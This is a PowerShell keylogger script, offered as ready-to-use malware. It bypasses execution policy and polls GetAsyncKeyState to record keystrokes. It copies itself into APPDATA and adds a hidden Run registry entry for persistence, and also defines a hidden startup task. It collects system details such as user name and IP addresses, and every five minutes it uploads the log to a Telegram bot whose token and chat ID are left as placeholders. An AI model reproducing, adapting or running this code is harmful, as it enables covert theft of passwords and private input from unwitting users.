Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Keylogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@ -Language CSharp

$banner = @"
 ##::: ##::'#######:::'#######::'########::  
 ###:: ##:'##.... ##:'##.... ##: ##.... ##:  
 ####: ##: ##:::: ##: ##:::: ##: ##:::: ##:  
 ## ## ##: ##:::: ##: ##:::: ##: ########::  
 ##. ####: ##:::: ##: ##:::: ##: ##.... ##:  
 ##:. ###: ##:::: ##: ##:::: ##: ##:::: ##:  
 ##::. ##:. #######::. #######:: ########::  
..::::..:::.......::::.......:::........:::  
___________________________________________________________________________
"@

Write-Host $banner

$logPath = "$env:APPDATA\catch.txt"
$scriptPath = "$env:APPDATA\catch.ps1"
$maxLogSize = 10MB

function Save-Log {
    $timestamp = (Get-Date).ToString("yyyyMMdd-HHmmss")
    $archivedLogPath = "$env:APPDATA\keylog_$timestamp.txt"
    Rename-Item -Path $logPath -NewName $archivedLogPath
    Set-Content -Path $logPath -Value ""  
}

if (!(Test-Path -Path $scriptPath)) {
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath
}

function Set-HiddenTask {
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File $scriptPath"
    $taskTrigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -Action $taskAction -Trigger $taskTrigger -TaskName "Catch" -User "CURRENT_USER" -RunLevel Highest -Hidden
}

$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $registryPath -Name "Catch" -Value "powershell -WindowStyle Hidden -File $scriptPath"

$botToken = "Replace_With_Your_Telegram_Bot_Token"
$chatID = "Replace with your Chat ID"

function Send-ToTelegram {
    param (
        [string]$filePath
    )
    try {
        $url = "https://api.telegram.org/bot$botToken/sendDocument"
        $file = Get-Item -LiteralPath $filePath
        $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString()
        
        $header = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }

        $body = @"
--$boundary
Content-Disposition: form-data; name="chat_id"

$chatID
--$boundary
Content-Disposition: form-data; name="document"; filename="$($file.Name)"
Content-Type: application/octet-stream

$(Get-Content -Path $file.FullName -Encoding Byte -ReadCount 0)
--$boundary--
"@

        $response = Invoke-RestMethod -Uri $url -Method Post -Headers $header -Body $body
        Write-Host "File sent successfully to Telegram!" -ForegroundColor Green
    }
    catch {
        Write-Host "Error sending to Telegram: $_" -ForegroundColor Red
    }
}


function Get-SystemInfo {
    $computerName = $env:COMPUTERNAME
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" }).IPAddress
    $ipAddress6 = (Get-NetIPAddress -AddressFamily IPv6 | Where-Object { $_.IPAddress -ne "::1" }).IPAddress
    $storage = Get-PSDrive -PSProvider FileSystem | Select-Object Name, @{Name="Used(GB)";Expression={[math]::round($_.Used/1GB,2)}}, @{Name="Free(GB)";Expression={[math]::round($_.Free/1GB,2)}}, @{Name="Total(GB)";Expression={[math]::round($_.Used/1GB + $_.Free/1GB,2)}}
    $cpu = (Get-WmiObject -Class Win32_Processor).Name
    $ram = [math]::round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    $os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    $osArchitecture = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture
    $systemInfo = @"
[INFO] Computer Name: $computerName
[INFO] Current User: $currentUser
[INFO] IP Address (IPv4): $ipAddress
[INFO] IP Address (IPv6): $ipAddress6
[INFO] CPU: $cpu
[INFO] RAM: $ram GB
[INFO] OS: $os ($osArchitecture)
[INFO] Storage:
$($storage | Format-Table -AutoSize | Out-String)
"@

    return $systemInfo
}

Set-Content -Path $logPath -Value $banner
$systemInfo = Get-SystemInfo
Add-Content -Path $logPath -Value $systemInfo

Write-Host "Haha I'm Rocking in the background..." -ForegroundColor Green
$lastLoggedTime = Get-Date
while ($true) {
    Start-Sleep -Milliseconds 10
    foreach ($ascii in 32..255) {
        $state = [Keylogger]::GetAsyncKeyState($ascii)
        if ($state -eq -32767) {
            $key = [char]$ascii

            if ($ascii -ge 32 -and $ascii -le 126) {
                switch ($key) {
                    " " { $key = "_" }  
                    "`t" { $key = "[TAB]" }  
                    "`r" { 
                        $key = "[ENTER]" 
                        continue
                    }
                    "`b" { 
                        $key = "[BACKSPACE]" 
                        $logContent = Get-Content -Path $logPath -Raw
                        $logContent = $logContent.Substring(0, $logContent.Length - 1)
                        Set-Content -Path $logPath -Value $logContent
                        continue
                    }
                    "[F1]" { $key = "[F1]" }
                    "[F2]" { $key = "[F2]" }
                    "[Esc]" { $key = "[ESC]" }
                    "[CapsLock]" { $key = "[CAPSLOCK]" }
                    "[NumLock]" { $key = "[NUMLOCK]" }
                    "[ScrollLock]" { $key = "[SCROLLLOCK]" }
                    "[Del]" { $key = "[DEL]" }
                    "[Insert]" { $key = "[INSERT]" }
                    "[Home]" { $key = "[HOME]" }
                    "[End]" { $key = "[END]" }
                    "[PgUp]" { $key = "[PGUP]" }
                    "[PgDn]" { $key = "[PGDN]" }
                    "[Left]" { $key = "[LEFT]" }
                    "[Right]" { $key = "[RIGHT]" }
                    "[Up]" { $key = "[UP]" }
                    "[Down]" { $key = "[DOWN]" }
                    default { }
                }

                Add-Content -Path $logPath -Value $key
            }
        }
    }

    $currentTime = Get-Date
    if (($currentTime - $lastLoggedTime).TotalHours -ge 1) {
        $systemInfo = Get-SystemInfo
        Add-Content -Path $logPath -Value $systemInfo
        $lastLoggedTime = $currentTime
    }

    $logSize = (Get-Item $logPath).Length
    if ($logSize -gt $maxLogSize) {
        Save-Log
    }

    if ((Get-Date).Minute % 5 -eq 0) {
        Send-ToTelegram -filePath $logPath
        Start-Sleep -Seconds 60  
    }
}
